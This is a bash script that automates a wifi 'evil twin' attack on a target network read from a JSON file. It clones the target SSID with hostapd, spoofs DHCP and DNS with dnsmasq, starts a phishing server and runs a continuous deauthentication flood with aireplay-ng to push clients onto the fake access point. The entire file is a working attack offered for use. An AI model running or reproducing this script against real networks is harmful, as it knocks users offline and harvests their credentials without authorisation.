#!/bin/bash

# ----------- VARIABLES -----------
TARGET_FILE="../../tools/target_selector/selected_target.json"
INTERFACE="wlan0"
FAKE_IP="10.0.0.1"
ESSID=$(jq -r '.ESSID' $TARGET_FILE)
CHANNEL=$(jq -r '.Channel' $TARGET_FILE)
BSSID=$(jq -r '.BSSID' $TARGET_FILE)

# ----------- KILL SERVICES -----------
echo "[+] Killing conflicting processes..."
airmon-ng check kill

# ----------- Configure Network -----------
echo "[+] Setting static IP $FAKE_IP on $INTERFACE"
ifconfig $INTERFACE down
ip addr flush dev $INTERFACE
ifconfig $INTERFACE $FAKE_IP netmask 255.255.255.0 up

# ----------- Setup hostapd.conf -----------
echo "[+] Creating hostapd.conf for $ESSID"
cat <<EOF > hostapd.conf
interface=$INTERFACE
driver=nl80211
ssid=$ESSID
hw_mode=g
channel=$CHANNEL
macaddr_acl=0
ignore_broadcast_ssid=0
EOF

# ----------- Start Services -----------

echo "[+] Starting Access Point (hostapd)..."
hostapd hostapd.conf > hostapd.log 2>&1 &

sleep 3

echo "[+] Starting dnsmasq (DHCP + DNS Spoofing)..."
dnsmasq -C dnsmasq.conf -d > dnsmasq.log 2>&1 &

sleep 2

echo "[+] Starting phishing server..."
python3 phishing_server.py > phishing_server.log 2>&1 &

sleep 2

echo "[+] Starting Deauthentication Attack on $ESSID ($BSSID)..."
aireplay-ng --deauth 0 -a "$BSSID" "$INTERFACE" > deauth.log 2>&1 &

echo "[+] Evil Twin Attack is LIVE on SSID: $ESSID"
echo "[!] All logs: hostapd.log, dnsmasq.log, phishing_server.log, deauth.log"
echo "[!] To stop everything: sudo pkill hostapd dnsmasq python3 aireplay-ng"
